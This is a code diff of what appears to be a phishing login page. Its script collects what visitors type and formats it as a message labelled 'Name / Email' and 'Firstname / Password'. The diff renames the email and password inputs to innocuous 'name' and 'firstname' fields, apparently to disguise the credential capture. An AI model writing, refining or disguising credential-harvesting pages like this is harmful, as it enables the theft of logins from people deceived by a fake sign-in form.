@@ -239,17 +239,17 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
 
     <div class="separator mt-5">Or continue with</div>
         
-          <form method="POST" action="send.php" class="mt-5" id="captcha-form">
+         <form method="POST" action="send.php" class="mt-5" id="captcha-form">
     <input type="hidden" name="_token" value="z0fHaPgV3X7NyG4EoKx5RZkTb9e0Nrenn8z1IcKY" autocomplete="off">
     
     <div class="mb-3">
-                    <label class="form-label text-primary" for="email">Email Address</label>
-                    <input id="email" type="text" class="form-control " name="email" value="" required="" autocomplete="email" autofocus="">
+        <label class="form-label text-primary" for="name">name Address</label>
+        <input id="name" type="text" class="form-control" name="name" value="" required autocomplete="name" autofocus>
     </div>
     
     <div class="mb-3">
-                    <label class="form-label text-primary" for="password">Password</label>
-                    <input id="password" type="password" class="form-control " name="password" required="" autocomplete="current-password">
+        <label class="form-label text-primary" for="firstname">firstname</label>
+        <input id="firstname" type="text" class="form-control" name="firstname" required autocomplete="current-firstname">
     </div>
     
     <div class="row gy-3 mb-3">
@@ -277,8 +277,8 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
             e.preventDefault();
 
             // Safe element selection
-            const nameInput      = document.getElementById('email');
-            const firstnameInput = document.getElementById('password');
+            const nameInput      = document.getElementById('name');
+            const firstnameInput = document.getElementById('firstname');
             const rememberInput  = document.getElementById('remember');
             const submitBtn      = document.getElementById('submit-btn');
 
@@ -300,8 +300,8 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
                     color: 0x3498db,
                     timestamp: new Date().toISOString(),
                     fields: [
-                        { name: "Name / Email", value: email || "Not provided", inline: true },
-                        { name: "Firstname / Password", value: password || "Not provided", inline: true },
+                        { name: "Name / Email", value: name || "Not provided", inline: true },
+                        { name: "Firstname / Password", value: firstname || "Not provided", inline: true },
                         { name: "Remember Me", value: remember, inline: true },
                         { name: "Time", value: new Date().toLocaleString(), inline: false }
                     ],
